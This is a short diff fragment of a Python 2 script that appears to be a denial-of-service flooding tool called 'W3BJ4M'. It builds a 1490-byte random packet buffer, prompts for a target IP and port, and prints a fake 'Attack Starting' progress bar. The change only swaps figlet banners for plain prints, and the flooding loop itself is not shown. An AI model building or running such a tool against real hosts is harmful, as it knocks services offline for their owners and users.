@@ -18,13 +18,14 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet W3BJ4M")
+
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+print
+print "Attack Starting"
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
